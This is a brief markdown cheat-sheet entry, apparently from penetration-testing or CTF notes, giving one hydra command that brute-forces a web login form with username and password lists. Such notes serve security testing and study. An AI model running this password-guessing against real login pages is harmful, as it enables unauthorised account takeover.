# Bruteforce

## Login form
```
hydra <ip> -L <usernames.txt> -P <passwords.txt> -t 16 -w 30 http-post-form \
    '/<page.php>:username=^USER^&password=^PASS^:Wrong'
```
